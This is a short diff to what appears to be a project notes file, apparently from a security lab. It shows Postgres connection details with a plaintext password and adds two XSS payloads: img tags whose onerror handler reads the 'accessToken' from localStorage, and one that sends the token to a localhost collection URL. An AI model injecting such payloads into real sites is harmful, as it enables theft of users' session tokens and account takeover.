@@ -14,3 +14,8 @@ PGCONNECTION=postgres://postgres:1234@localhost:4242/target
 ```
 
 PGPASSWORD=1234 psql -h frankfurt-postgres.render.com -U target target -f db.sql
+
+```html
+<img src="" onerror="console.log(localStorage.getItem('accessToken'))" >
+<img src="" onerror="fetch('http://localhost:3001?q='+localStorage.getItem('accessToken'))" >
+```
